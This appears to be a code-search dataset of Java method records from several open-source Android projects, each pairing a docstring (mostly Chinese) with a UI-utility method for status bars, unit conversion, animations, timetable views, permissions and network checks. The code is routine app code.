{"docstring": "/**\n * \u9488\u5bf9\u6839\u5e03\u5c40\u662f CoordinatorLayout, \u4f7f\u72b6\u6001\u680f\u534a\u900f\u660e\n * <p>\n * \u9002\u7528\u4e8e\u56fe\u7247\u4f5c\u4e3a\u80cc\u666f\u7684\u754c\u9762,\u6b64\u65f6\u9700\u8981\u56fe\u7247\u586b\u5145\u5230\u72b6\u6001\u680f\n *\n * @param activity       \u9700\u8981\u8bbe\u7f6e\u7684activity\n * @param statusBarAlpha \u72b6\u6001\u680f\u900f\u660e\u5ea6\n */\n", "func_signal": "public static void setTranslucentForCoordinatorLayout(Activity activity, int statusBarAlpha)", "code": "{\n    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {\n        return;\n    }\n    transparentStatusBar(activity);\n    addTranslucentView(activity, statusBarAlpha);\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u8bbe\u7f6e\u72b6\u6001\u680f\u989c\u8272(5.0\u4ee5\u4e0b\u65e0\u534a\u900f\u660e\u6548\u679c,\u4e0d\u5efa\u8bae\u4f7f\u7528)\n *\n * @param activity \u9700\u8981\u8bbe\u7f6e\u7684 activity\n * @param color    \u72b6\u6001\u680f\u989c\u8272\u503c\n */\n", "func_signal": "@Deprecated\npublic static void setColorDiff(Activity activity, @ColorInt int color)", "code": "{\n    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.KITKAT) {\n        return;\n    }\n    activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);\n    // \u751f\u6210\u4e00\u4e2a\u72b6\u6001\u680f\u5927\u5c0f\u7684\u77e9\u5f62\n    ViewGroup decorView = (ViewGroup) activity.getWindow().getDecorView();\n    int count = decorView.getChildCount();\n    if (count > 0 && decorView.getChildAt(count - 1) instanceof StatusBarView) {\n        decorView.getChildAt(count - 1).setBackgroundColor(color);\n    } else {\n        StatusBarView statusView = createStatusBarView(activity, color);\n        decorView.addView(statusView);\n    }\n    setRootView(activity);\n}", "path": "app\\src\\main\\java\\com\\coder\\guoy\\recyclerview\\view\\statusbar\\StatusBarUtil.java", "repo_name": "CoderGuoy/Coder", "stars": 540, "license": "None", "language": "java", "size": 26709}
{"docstring": "/**\n * \u5c06dip\u6216dp\u503c\u8f6c\u6362\u4e3apx\u503c\uff0c\u4fdd\u8bc1\u5c3a\u5bf8\u5927\u5c0f\u4e0d\u53d8\n *\n * @return\n */\n", "func_signal": "public static int dip2px(Context context, float dipValue)", "code": "{\n    final float scale = context.getResources().getDisplayMetrics().density;\n    return (int) (dipValue * scale + 0.5f);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\tools\\DisplayUtil.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u521d\u59cb\u5316viewpager\u7684\u6570\u636e\n */\n", "func_signal": "private void initViewPagerData()", "code": "{\n    pageFragmentCache.clear();\n    for (int x = 0; x < 3; x++) {\n        Fragment fragment = null;\n        if (x == 1) {\n            fragment = new LayerFragment();\n        } else {\n            fragment = new LoadingFragment();\n        }\n        pageFragmentCache.add(fragment);\n    }\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\ui\\fragment\\MainDialogFragment.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u8bbe\u7f6e\u793c\u7269item\u663e\u793a\u7684\u6570\u636e\n * @param giftBean\n */\n", "func_signal": "public void setData(GiftBean giftBean)", "code": "{\n    this.giftBean=giftBean;\n    tag = giftBean.getUserName() + giftBean.getGiftName();\n    tvUserName.setText(giftBean.userName);\n    tvMessage.setText(giftBean.giftName);\n    giftNum.setText(\"x\"+giftBean.group);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\GiftItemLayout.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u5c06px\u503c\u8f6c\u6362\u4e3asp\u503c\uff0c\u4fdd\u8bc1\u6587\u5b57\u5927\u5c0f\u4e0d\u53d8\n *\n * @return\n */\n", "func_signal": "public static int px2sp(Context context, float pxValue)", "code": "{\n    final float fontScale = context.getResources().getDisplayMetrics().scaledDensity;\n    return (int) (pxValue / fontScale + 0.5f);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\tools\\DisplayUtil.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u52a8\u6001\u7684\u4fee\u6539listview\u7684\u9ad8\u5ea6\n *\n * @param heightPX\n */\n", "func_signal": "private void dynamicChangeListviewH(int heightPX)", "code": "{\n    ViewGroup.LayoutParams layoutParams = lvmessage.getLayoutParams();\n    layoutParams.height = DisplayUtil.dip2px(getActivity(), heightPX);\n    lvmessage.setLayoutParams(layoutParams);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\ui\\fragment\\LayerFragment.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u5207\u6362\u83dc\u5355\n */\n", "func_signal": "public void switchMenu()", "code": "{\n    if (getScrollX() == -leftMenuWidth) {\n        closeLeftMenu();/*\u6b64\u65f6\u662f\u5f00\u7740\u7684\uff0c\u5e94\u8be5\u5173*/\n    } else {\n        openLeftMenu();/*\u5e94\u8be5\u6253\u5f00*/\n    }\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\SlideMenu.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/*\u8bbe\u7f6eMainDialogFragment\u7684\u6837\u5f0f\uff0c\u8fd9\u91cc\u7684\u4ee3\u7801\u6700\u597d\u8fd8\u662f\u7528\u6211\u7684\uff0c\u5927\u5bb6\u4e0d\u8981\u6539\u52a8*/\n", "func_signal": "@Override\n            public void onBackPressed()", "code": "{\n                super.onBackPressed();\n                getActivity().finish();\n            }", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\ui\\fragment\\MainDialogFragment.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u5934\u90e8\u5e03\u5c40\u6267\u884c\u9000\u51fa\u7684\u52a8\u753b\n */\n", "func_signal": "private void animateToHide()", "code": "{\n    ObjectAnimator leftAnim = ObjectAnimator.ofFloat(rlsentimenttime, \"translationX\", 0, -rlsentimenttime.getWidth());\n    ObjectAnimator topAnim = ObjectAnimator.ofFloat(llpicimage, \"translationY\", 0, -llpicimage.getHeight());\n    animatorSetHide.playTogether(leftAnim, topAnim);\n    animatorSetHide.setDuration(300);\n    animatorSetHide.addListener(new AnimatorListenerAdapter() {\n        @Override\n        public void onAnimationEnd(Animator animation) {\n            super.onAnimationEnd(animation);\n            isOpen = false;\n        }\n\n        @Override\n        public void onAnimationStart(Animator animation) {\n            super.onAnimationStart(animation);\n            isOpen = true;\n        }\n    });\n    if (!isOpen) {\n        animatorSetHide.start();\n    }\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\ui\\fragment\\LayerFragment.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u5c06px\u503c\u8f6c\u6362\u4e3adip\u6216dp\u503c\uff0c\u4fdd\u8bc1\u5c3a\u5bf8\u5927\u5c0f\u4e0d\u53d8\n *\n * @return\n */\n", "func_signal": "public static int px2dip(Context context, float pxValue)", "code": "{\n    final float scale = context.getResources().getDisplayMetrics().density;\n    return (int) (pxValue / scale + 0.5f);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\tools\\DisplayUtil.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u5c06sp\u503c\u8f6c\u6362\u4e3apx\u503c\uff0c\u4fdd\u8bc1\u6587\u5b57\u5927\u5c0f\u4e0d\u53d8\n *\n * @return\n */\n", "func_signal": "public static int sp2px(Context context, float spValue)", "code": "{\n    final float fontScale = context.getResources().getDisplayMetrics().scaledDensity;\n    return (int) (spValue * fontScale + 0.5f);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\tools\\DisplayUtil.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u521d\u59cb\u5316\u793c\u7269\u6570\u5b57\u52a8\u753b\n */\n", "func_signal": "private void initNumAnim()", "code": "{\n    numAnim = new ScaleAnimation(0.5f, 1.0f, 0.5f, 1.0f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f);\n    numAnim.setDuration(200);\n    numAnim.setAnimationListener(this);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\GiftItemLayout.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u8fd9\u4e2a\u65b9\u6cd5\u662fonMeasure\u6267\u884c\u4e4b\u540e\u6267\u884c\uff0c\u6240\u4ee5\u5728\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u53ef\u4ee5\u83b7\u53d6\u6240\u6709\u5b50view\u7684\u5bbd\u9ad8\n */\n", "func_signal": "@Override\nprotected void onSizeChanged(int w, int h, int oldw, int oldh)", "code": "{\n    super.onSizeChanged(w, h, oldw, oldh);\n    leftMenuWidth = leftMenuView.getMeasuredWidth();\n    leftMenuHeight = leftMenuView.getMeasuredHeight();\n    mainWidth = mainView.getMeasuredWidth();\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\SlideMenu.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u6253\u5f00\u5de6\u8fb9\u83dc\u5355\n */\n", "func_signal": "private void openLeftMenu()", "code": "{\n    scroller.startScroll(getScrollX(), 0, -leftMenuWidth - getScrollX(), 0, 100);\n    invalidate();\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\SlideMenu.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u521d\u59cb\u5316\n *\n * @param context\n */\n", "func_signal": "private void init(Context context)", "code": "{\n    firstGiftItemInAnim = AnimationUtils.loadAnimation(context, R.anim.gift_in);\n    firstGiftItemInAnim.setFillAfter(true);\n    firstGiftItemOutAnim = AnimationUtils.loadAnimation(context, R.anim.gift_out);\n    firstGiftItemOutAnim.setFillAfter(true);\n\n    lastGiftItemInAnim = AnimationUtils.loadAnimation(context, R.anim.gift_in);\n    lastGiftItemInAnim.setFillAfter(true);\n    lastGiftItemOutAnim = AnimationUtils.loadAnimation(context, R.anim.gift_out);\n    lastGiftItemOutAnim.setFillAfter(true);\n\n    firstGiftItemOutAnim.setAnimationListener(this);\n    lastGiftItemOutAnim.setAnimationListener(this);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\GiftRootLayout.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u521d\u59cb\u5316\u4f4d\u79fb\u52a8\u753b\n */\n", "func_signal": "private void initTranslateAnim()", "code": "{\n    translateAnim = new TranslateAnimation(-300, 0, 0, 0);\n    translateAnim.setDuration(200);\n    translateAnim.setFillAfter(true);\n    translateAnim.setAnimationListener(this);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\GiftItemLayout.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u8f6f\u952e\u76d8\u663e\u793a\u4e0e\u9690\u85cf\u7684\u76d1\u542c\n */\n", "func_signal": "private void softKeyboardListnenr()", "code": "{\n    SoftKeyBoardListener.setListener(getActivity(), new SoftKeyBoardListener.OnSoftKeyBoardChangeListener() {\n        @Override\n        public void keyBoardShow(int height) {/*\u8f6f\u952e\u76d8\u663e\u793a\uff1a\u6267\u884c\u9690\u85cftitle\u52a8\u753b\uff0c\u5e76\u4fee\u6539listview\u9ad8\u5ea6\u548c\u88c5\u8f7d\u793c\u7269\u5bb9\u5668\u7684\u9ad8\u5ea6*/\n            animateToHide();\n            dynamicChangeListviewH(100);\n        }\n\n        @Override\n        public void keyBoardHide(int height) {/*\u8f6f\u952e\u76d8\u9690\u85cf\uff1a\u9690\u85cf\u804a\u5929\u8f93\u5165\u6846\u5e76\u663e\u793a\u804a\u5929\u6309\u94ae\uff0c\u6267\u884c\u663e\u793atitle\u52a8\u753b\uff0c\u5e76\u4fee\u6539listview\u9ad8\u5ea6\u548c\u88c5\u8f7d\u793c\u7269\u5bb9\u5668\u7684\u9ad8\u5ea6*/\n            tvChat.setVisibility(View.VISIBLE);\n            llInputParent.setVisibility(View.GONE);\n            animateToShow();\n            dynamicChangeListviewH(150);\n        }\n    });\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\ui\\fragment\\LayerFragment.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u5f53\u5b8c\u6210\u4ece\u5e03\u5c40\u6587\u4ef6\u52a0\u8f7dVIew\u7684\u65f6\u5019,\u8be5\u65b9\u6cd5\u6267\u884c\u5b8c\u540e\u5c31\u77e5\u9053\u81ea\u5df1\u53c8\u51e0\u4e2a\u5b50view\n */\n", "func_signal": "@Override\nprotected void onFinishInflate()", "code": "{\n    super.onFinishInflate();\n    leftMenuView = getChildAt(0);\n    mainView = getChildAt(1);\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\SlideMenu.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u6267\u884c\u4e86\u793c\u7269\u6570\u91cf\u8fde\u63a5\u6548\u679c\n * @param group\n */\n", "func_signal": "public void addCount(int group)", "code": "{\n    handler.removeMessages(0);\n    giftBean.group=giftBean.group+group;\n    giftNum.setText(\"x\"+giftBean.group);\n    giftNum.startAnimation(numAnim);// \u6267\u884c\u793c\u7269\u6570\u91cf\u52a8\u753b\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\GiftItemLayout.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u663e\u793a\u804a\u5929\u5e03\u5c40\n */\n", "func_signal": "private void showChat()", "code": "{\n    tvChat.setVisibility(View.GONE);\n    llInputParent.setVisibility(View.VISIBLE);\n    llInputParent.requestFocus();\n    showKeyboard();\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\ui\\fragment\\LayerFragment.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u5173\u95ed\u5de6\u8fb9\u83dc\u5355\n */\n", "func_signal": "private void closeLeftMenu()", "code": "{\n    scroller.startScroll(getScrollX(), 0, 0 - getScrollX(), 0, 100);\n    invalidate();\n}", "path": "app\\src\\main\\java\\com\\johnny\\livelayout\\view\\SlideMenu.java", "repo_name": "Qiang3570/LiveLayout", "stars": 564, "license": "None", "language": "java", "size": 4540}
{"docstring": "/**\n * \u4fee\u6539\u8bfe\u7a0b\u91cd\u53e0\u7684\u6837\u5f0f\uff0c\u5728\u8be5\u63a5\u53e3\u4e2d\uff0c\u4f60\u53ef\u4ee5\u81ea\u5b9a\u4e49\u51fa\u5f88\u591a\u7684\u6548\u679c\n */\n", "func_signal": "protected void modifyOverlayStyle()", "code": "{\n    mTimetableView.callback(new OnItemBuildAdapter() {\n                @Override\n                public void onItemUpdate(FrameLayout layout, TextView textView, TextView countTextView, Schedule schedule, GradientDrawable gd) {\n                    super.onItemUpdate(layout, textView, countTextView, schedule, gd);\n                    //\u53ef\u89c1\u8bf4\u660e\u91cd\u53e0\uff0c\u53d6\u6d88\u89d2\u6807\uff0c\u6dfb\u52a0\u89d2\u5ea6\n                    if (countTextView.getVisibility() == View.VISIBLE) {\n                        countTextView.setVisibility(View.GONE);\n                        gd.setCornerRadii(new float[]{0, 0, 20, 20, 0, 0, 0, 0});\n                    }\n                }\n            });\n    mTimetableView.updateView();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\ItemStyleActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u9690\u85cf\u5de6\u4fa7\u8bbe\u7f6e\u5f53\u524d\u5468\u7684\u63a7\u4ef6\n */\n", "func_signal": "public WeekView hideLeftLayout()", "code": "{\n    \tleftlayout.setVisibility(View.GONE);\n    \treturn this;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u672c\u5730\u914d\u7f6e\u5bfc\u51fa\u5230\u6587\u672c\n */\n", "func_signal": "private void exportLocalConfig()", "code": "{\n    Set<String> set=mScheduleConfig.export();\n    configSet=set;\n    String content=\"\";\n    for(String s:set) content+=s+\"\\n\";\n    AlertDialog.Builder builder=new AlertDialog.Builder(this)\n            .setTitle(\"\u914d\u7f6e\u5bfc\u51fa\")\n            .setMessage(content)\n            .setPositiveButton(\"\u6211\u77e5\u9053\u4e86\",null);\n    builder.create().show();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\LocalConfigActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u6e05\u9664\u672c\u5730\u914d\u7f6e\u9879\n *\n */\n", "func_signal": "protected void clearLocalConfig()", "code": "{\n    mScheduleConfig.clear();\n    Toast.makeText(this,\"\u6e05\u9664\u6210\u529f\uff0c\u4e0b\u6b21\u8fdb\u5165\u751f\u6548!\",Toast.LENGTH_SHORT).show();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\LocalConfigActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u5207\u6362\u4e3a\u4e2d\u6587\n */\n", "func_signal": "public void changeChineseLanguage()", "code": "{\n    mTimetableView.callback((ISchedule.OnDateBuildListener) null)\n            .callback((ISchedule.OnItemBuildListener) null)\n            .updateView();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\ItemStyleActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u8bbe\u7f6e\u975e\u672c\u5468\u8bfe\u7684\u80cc\u666f\n *\n * @param color\n */\n", "func_signal": "public void setNonThisWeekBgcolor(int color)", "code": "{\n    mTimetableView.colorPool().setUselessColor(color);\n    mTimetableView.updateView();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\ItemStyleActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u66f4\u65b0\u4e00\u4e0b\uff0c\u9632\u6b62\u56e0\u7a0b\u5e8f\u5728\u540e\u53f0\u65f6\u95f4\u8fc7\u957f\uff08\u8d85\u8fc7\u4e00\u5929\uff09\u800c\u5bfc\u81f4\u7684\u65e5\u671f\u6216\u9ad8\u4eae\u4e0d\u51c6\u786e\u95ee\u9898\u3002\n */\n", "func_signal": "@Override\nprotected void onStart()", "code": "{\n    super.onStart();\n    if(initFinish){\n        mTimetableView.onDateBuildListener()\n                .onHighLight();\n    }\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\LocalConfigActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u8bbe\u7f6e\u95f4\u8ddd\u4ee5\u53ca\u5f27\u5ea6\n * \u8be5\u65b9\u6cd5\u53ea\u80fd\u540c\u65f6\u8bbe\u7f6e\u56db\u4e2a\u89d2\u7684\u5f27\u5ea6\uff0c\u8bbe\u7f6e\u5355\u4e2a\u89d2\u7684\u5f27\u5ea6\u53ef\u53c2\u8003\u4e0b\u6587\n */\n", "func_signal": "protected void setMarginAndCorner()", "code": "{\n    mTimetableView.cornerAll(0)\n            .marTop(0)\n            .marLeft(0)\n            .updateView();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\ItemStyleActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u5207\u6362\u4e3a\u82f1\u6587\n */\n", "func_signal": "public void changeEnglishLanguage()", "code": "{\n    mTimetableView.callback(new OnEnglishDateBuildAdapter())\n            .callback(new OnEnglishItemBuildAdapter())\n            .updateView();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\ItemStyleActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u4fee\u6539\u663e\u793a\u7684\u6587\u672c\n */\n", "func_signal": "public void buildItemText()", "code": "{\n    mTimetableView.callback(new OnItemBuildAdapter() {\n                @Override\n                public String getItemText(Schedule schedule, boolean isThisWeek) {\n                    if (isThisWeek) return \"[\u672c\u5468]\" + schedule.getName();\n                    return \"[\u975e\u672c\u5468]\" + schedule.getName();\n                }\n            })\n            .updateView();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\ItemStyleActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u5f53\u524d\u5468\u88ab\u6539\u53d8\u540e\u53ef\u4ee5\u8c03\u7528\u8be5\u65b9\u5f0f\u4fee\u6b63\u4e00\u4e0b\u5e95\u90e8\u7684\u6587\u672c\n * @return\n */\n", "func_signal": "@Override\npublic WeekView updateView()", "code": "{\n    if(layouts==null||layouts.size()==0) return this;\n    if(textViews==null||textViews.size()==0) return this;\n\n    for(int i=0;i<layouts.size();i++){\n        if(curWeek-1==i) {\n            textViews.get(i).setText(\"(\u672c\u5468)\");\n        }\n        else{\n            textViews.get(i).setText(\"\");\n        }\n        layouts.get(i).setBackgroundColor(getContext().getResources().getColor(R.color.app_course_chooseweek_bg));\n    }\n\n    if(curWeek>0&&curWeek<=layouts.size()){\n        layouts.get(curWeek-1).setBackgroundDrawable(getContext().getResources().getDrawable(R.drawable.weekview_thisweek));\n    }\n    return this;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u8bbe\u7f6e\u5f53\u524d\u5468\n * @param curWeek\n * @return\n */\n", "func_signal": "@Override\npublic WeekView curWeek(int curWeek)", "code": "{\n    if(curWeek<1) curWeek=1;\n    this.curWeek = curWeek;\n    return this;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u83b7\u53d6\u6570\u636e\u6e90\n * @return\n */\n", "func_signal": "@Override\npublic List<Schedule> dataSource()", "code": "{\n    if (dataSource == null) dataSource = new ArrayList<>();\n    return dataSource;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u8bbe\u7f6e\u6570\u636e\u6e90\n * @param scheduleList\n * @return\n */\n", "func_signal": "@Override\npublic WeekView data(List<Schedule> scheduleList)", "code": "{\n    if (scheduleList == null) return null;\n    this.dataSource = scheduleList;\n    return this;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u4ece\u6587\u672c\u5bfc\u5165\u672c\u5730\u914d\u7f6e\n */\n", "func_signal": "private void loadLocalConfigSet()", "code": "{\n    if(configSet==null){\n        AlertDialog.Builder builder=new AlertDialog.Builder(this)\n                .setTitle(\"\u914d\u7f6e\u5bfc\u5165\")\n                .setMessage(\"\u8fd8\u6ca1\u6709\u5bfc\u51fa\uff0c\u5148\u5bfc\u51fa\u518d\u6765\u8bd5\u8bd5\u5427\")\n                .setPositiveButton(\"\u6211\u77e5\u9053\u4e86\",null);\n        builder.create().show();\n    }else{\n        mScheduleConfig.load(configSet);\n        Toast.makeText(this,\"\u914d\u7f6e\u5df2\u751f\u6548\",Toast.LENGTH_SHORT).show();\n    }\n    mTimetableView.updateView();\n}", "path": "AndroidTimetableView\\app\\src\\main\\java\\com\\zhuangfei\\android_timetableview\\views\\LocalConfigActivity.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u8bbe\u7f6eItem\u70b9\u51fb\u76d1\u542c\n * @param onWeekItemClickedListener\n * @return\n */\n", "func_signal": "public WeekView callback(IWeekView.OnWeekItemClickedListener onWeekItemClickedListener)", "code": "{\n    this.onWeekItemClickedListener = onWeekItemClickedListener;\n    return this;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u5224\u65ad\u8be5\u63a7\u4ef6\u662f\u5426\u663e\u793a\n * @return\n */\n", "func_signal": "@Override\npublic boolean isShowing()", "code": "{\n    if(root.getVisibility()==GONE) return false;\n    return true;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u83b7\u53d6Item\u70b9\u51fb\u76d1\u542c\n * @return\n */\n", "func_signal": "public IWeekView.OnWeekItemClickedListener onWeekItemClickedListener()", "code": "{\n    if(onWeekItemClickedListener==null) onWeekItemClickedListener=new OnWeekItemClickedAdapter();\n    return onWeekItemClickedListener;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u8bbe\u7f6e\u6570\u636e\u6e90\n * @param list\n * @return\n */\n", "func_signal": "@Override\npublic WeekView source(List<? extends ScheduleEnable> list)", "code": "{\n    data(ScheduleSupport.transform(list));\n    return this;\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "/**\n * \u91cd\u7f6e\u80cc\u666f\u8272\n */\n", "func_signal": "public void resetBackground()", "code": "{\n    layouts.get(preIndex-1).setBackgroundColor(getContext().getResources().getColor(R.color.app_course_chooseweek_bg));\n    layouts.get(curWeek-1).setBackgroundDrawable(getContext().getResources().getDrawable(R.drawable.weekview_thisweek));\n}", "path": "AndroidTimetableView\\TimetableView\\src\\com\\zhuangfei\\timetable\\view\\WeekView.java", "repo_name": "zfman/TimetableView", "stars": 686, "license": "mit", "language": "java", "size": 22807}
{"docstring": "// \u5224\u65ad\u662f\u5426\u7f3a\u5c11\u6743\u9650\n", "func_signal": "private static boolean lacksPermission(String permission)", "code": "{\n    int checkSelfPermission = ContextCompat.checkSelfPermission(mContext, permission);\n    return checkSelfPermission == PackageManager.PERMISSION_GRANTED;\n}", "path": "app\\src\\main\\java\\com\\jun\\elephant\\util\\PermissionsChecker.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * Send a FATAL ERROR log message\n *\n * @param tag\n * @param msg\n * @param throwable\n */\n", "func_signal": "public static void f(String tag, String msg, Throwable throwable)", "code": "{\n    if (sLevel > LEVEL_FATAL) {\n        return;\n    }\n    Log.wtf(tag, msg, throwable);\n}", "path": "liraries\\ptr-lib\\src\\in\\srain\\cube\\views\\ptr\\util\\PtrCLog.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
{"docstring": "/**\n * \u5224\u65ad\u662f\u5426\u662f3G\u7f51\u7edc\n * @param context\n * @return\n */\n", "func_signal": "public static boolean is3rd(Context context)", "code": "{\n    ConnectivityManager cm = (ConnectivityManager) context\n            .getSystemService(Context.CONNECTIVITY_SERVICE);\n    NetworkInfo networkINfo = cm.getActiveNetworkInfo();\n    if (networkINfo != null\n            && networkINfo.getType() == ConnectivityManager.TYPE_MOBILE) {\n        return true;\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\jun\\elephant\\util\\NetworkUtils.java", "repo_name": "Freelander/Elephant", "stars": 923, "license": "apache-2.0", "language": "java", "size": 4617}
